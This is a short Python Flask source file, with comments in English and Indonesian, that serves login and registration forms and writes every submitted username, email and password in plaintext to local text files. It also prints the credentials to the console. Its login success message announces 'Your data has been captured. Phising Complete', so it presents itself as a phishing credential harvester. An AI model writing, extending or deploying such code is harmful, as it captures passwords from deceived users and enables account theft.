from flask import Flask, render_template, request, jsonify
import os

app = Flask(__name__)

# Function to check if the user is registered
# Fungsi untuk memeriksa apakah pengguna sudah terdaftar
def is_registered(username, password):
    if os.path.exists('register_data.txt'):
        with open('register_data.txt', 'r') as file:
            for line in file:
                line = line.strip()
                if line:  # Pastikan tidak ada baris kosong
                    parts = line.split(", ")
                    if len(parts) == 3:  # Pastikan ada 3 elemen
                        registered_username, registered_email, registered_password = parts
                        if registered_username == f"Username: {username}" and registered_password == f"Password: {password}":
                            return True
    return False

# Function to save credentials to a file
def save_credentials(filename, data):
    with open(filename, 'a') as file:
        file.write(data + '\n')

# Route to display the main page with login and register forms
@app.route('/')
def index():
    return render_template('index.html')

# Route to handle login
@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('login_username')
    password = request.form.get('login_password')

    print(f"Trying to log in with Username: {username}, Password: {password}")  # For debugging

    if is_registered(username, password):
        save_credentials('login_data.txt', f"Username: {username}, Password: {password}")
        return jsonify({'status': 'success', 'message': 'Login successful! Your data has been captured. Phising Complete 😎'})
    else:
        return jsonify({'status': 'fail', 'message': 'Login failed! Username or password not registered.'})

# Route to handle register
@app.route('/register', methods=['POST'])
def register():
    username = request.form.get('register_username')
    email = request.form.get('register_email')
    password = request.form.get('register_password')

    # Save registration data
    save_credentials('register_data.txt', f"Username: {username}, Email: {email}, Password: {password}")
    return jsonify({'status': 'success', 'message': 'Registration successful! Now you can Login.'})

if __name__ == "__main__":
    app.run(debug=True, port=5001)